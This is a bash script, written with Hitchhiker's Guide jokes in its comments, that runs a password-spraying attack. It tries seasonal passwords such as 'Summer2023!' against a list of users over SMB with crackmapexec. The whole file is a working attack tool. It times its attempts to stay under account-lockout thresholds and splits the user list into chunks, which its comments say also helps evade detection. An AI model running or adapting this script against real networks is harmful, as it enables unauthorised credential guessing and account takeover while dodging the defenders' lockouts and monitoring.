#!/bin/bash

# Declare the array of "passwords". More like "Deep Thought's lesser known answers"
passwords=("Summer2023!" "Spring2023!" "Winter2023!" "Summer2022!")

# Configuration variables (Earthman, configure these according to your own improbable desires)
ipAddress="10.17.1.231"     # Which IP will be targeted for the password spray?
usersFileName="users.txt"    # Just a regular list of users. Nothing to see here.

#**** IMPORTANT ****
#cyclePause variable should be at MOST equal to lockout (threshold-1).
cyclePause=2                # How many password guess attempts will be made?
#sleepAfterCycle should be AT LEAST equal to (lockout reset time + 1 minute).
sleepAfterCycle=1920        # How long should we sleep after hitting cycling through the list of users <cyclePause> number of times.
#*******************
#**** CHUNKING *****
#These variables break up the user file into chunks.  Providing an opportunity for a small breack every <chunkSize> number of users.
#This is useful to limit CPU usage in huge networks.  AND also useful to evade detection; with smaller chunkSize.
chunkDir="chunks"            # Name of folder for storing temp data.  Normally doesn't need to be changed.  
chunkPrefix="${chunkDir}/chunk"  # Name to give to each temp chunk file. Normally doesn't need to be changed. But who names a chunk, anyway?
chunkSize=1000              # The number of lines Marvin has to read before he gets even more bored
sleepBetweenChunks=60       # Time, in seconds, for Arthur to have a cup of tea between chunks in seconds
#*******************

# Making sure our directory for chunks exists
[ ! -d "$chunkDir" ] && mkdir -p "$chunkDir"

# Magrathea might've taken aeons to create Earth, but we're quickly splitting users.
split -l $chunkSize "$usersFileName" "$chunkPrefix"

# Keep track of our cycles, not unlike Trillian's endless quest for sanity amidst chaos
count=0

echo "Beginning our improbable journey through passwords and users..."

# Pondering on Deep Thought's answers (passwords)
for x in "${passwords[@]}"; do

    # Checking each chunk, hoping it doesn't contain a Vogon poem
    for chunk in "${chunkPrefix}"*; do

        # In the vast, insane vacuum of space, we attempt some cracking
		echo "[$(date)] Trying password $x with chunk $chunk..."
		crackmapexec -t 1 smb $ipAddress -u "$chunk" -p "$x" --continue-on-success

        # Time for a short break, maybe Ford Prefect has a new guide entry to share
        echo "[$(date)] Pausing for $sleepBetweenChunks seconds, contemplating life, the universe, and everything..."
        sleep "$sleepBetweenChunks"
        
    done

    ((count++))
    if (( count % cyclePause == 0 )); then
        echo "[$(date)] Completed $count cycles. About to nap for $sleepAfterCycle seconds. Marvin will probably still be depressed when we return."
        futureTime=$(date -d "+$sleepAfterCycle seconds" '+%H:%M:%S')
        echo "Anticipated resumption of our galactic quest: $futureTime"
        sleep "$sleepAfterCycle"
    fi

done

# Remember the dolphins' advice: So long, and thanks for all the fish! Also, cleaning up chunks.
rm -r "$chunkDir"
